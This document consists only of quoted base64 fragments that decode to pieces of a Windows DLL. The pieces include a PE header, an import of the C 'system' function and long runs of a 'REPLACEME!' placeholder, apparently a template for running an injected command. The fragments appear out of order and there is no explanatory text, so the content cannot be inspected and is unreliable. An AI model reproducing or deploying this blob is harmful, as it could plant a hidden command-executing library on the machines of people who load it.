2EJIAAAABIiUQkYEiNhCQgAQAASIlEJGgzyf8VofUAAEiNTCRg/xWe9QAAiUQkRIN8JEQAdRMPtkQkQYXAdQq5AwAAAOgl5f//SIHE8AUAAF/DzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMQFdIgeygAAAASI1EJDBIi/gzwLloAAAA86pIjUwkMP8V0/QAAItEJGyD4AGFwHQLD7dEJHCJRCQg6wjHRCQgCgAAAA+3RCQgSIHEoAAAAF/DzMzMzMzMzMzMzMzMzMzM','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzM','ExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VN','FTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExB','FDVAQAiLgEALS4BAGjVAQBALgEAWS4BAHzVAQBwLgEAsS4BADTWAQDQLgEAHy8BAGDWAQBALwEAwi8BAMDVAQDCLwEArDABANzVAQCsMAEAyDABAPjVAQCgMQEAzjIBAKDVAQAgMwEASzMBALTWAQBLMwEArzMBAMjWAQCvMwEAyzMBAOjWAQAgNAEAjDYBAIzWAQAwNwEATzgBAITVAQCgOAEAAjkBAAzWAQAgOQEAXzkBACTWAQBwOQEA8DwBAPzWAQDQPQEA9T0BABDXAQAQPgEAPz4BABjXAQBQPgEAlT8BAEzYAQDwPwEAdUABAJTXAQB1QAEAmUABAKzXAQCZQAEAvUABAMTXAQC9QAEAUUIBANzXAQBRQgEAWUIBAPTXAQBZQgEAYUIBAAjYAQBhQgEAekIBABzYAQAgQwEAJUQBADDYAQBwRAEAHEUBACDXAQAcRQEAukYBADjXAQC6RgEAfUgBAFTXAQB9SAEA20gBAGzXAQDbSAEA8UgBAIDXAQAgSgEAWkoBAGjYAQBwSgEAaEsBAGDYAQDASwEA4UsBAHDYAQDwSwEAJUwBAKzYAQBATAEAEU0BAJTYAQBQTQEAY00BAIzYAQBwTQEAC04BAHzYAQBATgEATk8BAITYAQCgTwEAMVABAJzYAQBgUAEAElEBAKTYAQDwYQEA8mEBAHjYAQAAcgEAGnIBAGDTAQAgcgEAQHIBAIzTAQBQcgEAmHIBANDTAQCwcgEA7XIBABzUAQAAcwEAIHMBAFjWAQAwcwEAUHMBAITWAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVigCAAAAAABaKgIAAAAAAEYqAgAAAAAANCoCAAAAAAAmKgIAAAAAABYqAgAAAAAABCoCAAAAAAD4KQIAAAAAAOwpAgAAAAAA3CkCAAAAAADGKQIAAAAAALApAgAAAAAAnikCAAAAAACKKQIAAAAAAG4pAgAAAAAAXCkCAAAAAAA+KQIAAAAAACIpAgAAAAAADikCAAAAAAD6KAIAAAAAAOAoAgAAAAAAzCgCAAAAAAC2KAIAAAAAAJwoAgAAAAAAhigCAAAAAABwKAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAICYCAAAAAABkJgIAAAAAAHwmAgAAAAAAnCYCAAAAAAC4JgIAAAAAANImAgAAAAAAQiYCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADGJwIAAAAAAK4nAgAAAAAAkicCAAAAAAB2JwIAAAAAAFQnAgAAAAAA1CcCAAAAAAA0JwIAAAAAACgnAgAAAAAAFicCAAAAAAAGJwIAAAAAAPwmAgAAAAAA6icCAAAAAAD0JwIAAAAAAAAoAgAAAAAAHCgCAAAAAAAsKAIAAAAAADwoAgAAAAAAQicCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiCQCAAAAAAAAAAAA6iYCAFAhAgAgJQIAAAAAAAAAAABIKAIA6CECADgjAgAAAAAAAAAAAG4qAgAAIAIAAAAAAAAAAAAAAAAAAAAAAAAAAABWKAIAAAAAAFoqAgAAAAAARioCAAAAAAA0KgIAAAAAACYqAgAAAAAAFioCAAAAAAAEKgIAAAAAAPgpAgAAAAAA7CkCAAAAAADcKQIAAAAAAMYpAgAAAAAAsCkCAAAAAACeKQIAAAAAAIopAgAAAAAAbikCAAAAAABcKQIAAAAAAD4pAgAAAAAAIikCAAAAAAAOKQIAAAAAAPooAgAAAAAA4CgCAAAAAADMKAIAAAAAALYoAgAAAAAAnCgCAAAAAACGKAIAAAAAAHAoAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABh7MdDJY2pECWNqRAljakQkRFGECeNqRBL1qgRJo2pEEvWqhEnjakQS9asESmNqRBL1q0RL42pEPhyYhAnjakQJY2oEBaNqRD31qwRJo2pEPfWqREkjakQ99ZWECSNqRD31qsRJI2pEFJpY2gljakQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAGSGCgCqd/BWAAAAAAAAAADwACIgCwIOAAB0AAAAkgAAAAAAAK0SAQAAEAAAAAAAgAEAAAAAEAAAAAIAAAYAAAAAAAAABgAAAAAAAAAAcAIAAAQAAAAAAAACAGABAAAQAAAAAAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAADbAQCZAQAA6CICAFAAAAAAUAIAPAQAAADwAQCMHAAAAAAAAAAAAAAAYAIATAAAAHDIAQA4AAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAF9fdGVsZW1ldHJ5X21haW5faW52b2tlX3RyaWdnZXIAKQBfX3RlbGVtZXRyeV9tYWluX3JldHVybl90cmlnZ2VyAAgAX19DX3NwZWNpZmljX2hhbmRsZXIAACUAX19zdGRfdHlwZV9pbmZvX2Rlc3Ryb3lfbGlzdAAALgBfX3ZjcnRfR2V0TW9kdWxlRmlsZU5hbWVXAC8AX192Y3J0X0dldE1vZHVsZUhhbmRsZVcAMQBfX3ZjcnRfTG9hZExpYnJhcnlFeFcAVkNSVU5USU1FMTQwRC5kbGwARQVzeXN0ZW0AAAQAX0NydERiZ1JlcG9ydAAFAF9DcnREYmdSZXBvcnRXAAB0AV9pbml0dGVybQB1AV9pbml0dGVybV9lAMECX3NlaF9maWx0ZXJfZGxsAHEBX2luaXRpYWxpemVfbmFycm93X2Vudmlyb25tZW50AAByAV9pbml0aWFsaXplX29uZXhpdF90YWJsZQAAtAJfcmVnaXN0ZXJfb25leGl0X2Z1bmN0aW9uAOUAX2V4ZWN1dGVfb25leGl0X3RhYmxlAMIAX2NydF9hdGV4aXQAwQBfY3J0X2F0X3F1aWNrX2V4aXQAAKQAX2NleGl0AABKBXRlcm1pbmF0ZQBoAF9fc3RkaW9fY29tbW9uX3ZzcHJpbnRmX3MAmwNfd21ha2VwYXRoX3MAALcDX3dzcGxpdHBhdGhfcwBjBXdjc2NweV9zAAB1Y3J0YmFzZWQuZGxsADAEUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAEAJHZXRDdXJyZW50UHJvY2Vzc0lkABQCR2V0Q3VycmVudFRocmVhZElkAADdAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAFQDSW5pdGlhbGl6ZVNMaXN0SGVhZACuBFJ0bENhcHR1cmVDb250ZXh0ALUEUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAAvARSdGxWaXJ0dWFsVW53aW5kAABqA0lzRGVidWdnZXJQcmVzZW50AJIFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABSBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgDFAkdldFN0YXJ0dXBJbmZvVwBwA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAbQJHZXRNb2R1bGVIYW5kbGVXAABEBFJ','AAD/JbzQAAD/Ja7QAAD/JaDQAAD/JZLQAAD/JeTQAAD/JXbQAAD/JWjQAAD/JVrQAAD/JUzQAAD/JT7QAAD/JWDQAAD/JYrQAAD/JYzQAAD/JY7QAAD/JZDQAAD/JZLQAAD/JZTQAAD/JSbOAAD/JejOAAD/JdrOAAD/JczOAAD/Jb7OAAD/JbDOAAD/JaLOAAD/JZTOAAD/JYbOAAD/JXjOAAD/JWrOAAD/JVzOAAD/JU7OAAD/JUDOAAD/JTLOAAD/JSTOAAD/JRbOAAD/JQjOAAD/JfrNAAD/JezNAAD/Jd7NAAD/JdDNAAD/JcLNAAD/JbTNAAD/JabNAAD/JZjNAACwAcPMzMzMzMzMzMzMzMzMsAHDzMzMzMzMzMzMzMzMzLABw8zMzMzMzMzMzMzMzMyITCQIsAHDzMzMzMzMzMzMiEwkCLABw8zMzMzMzMzMzDPAw8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzM','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','Q0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRV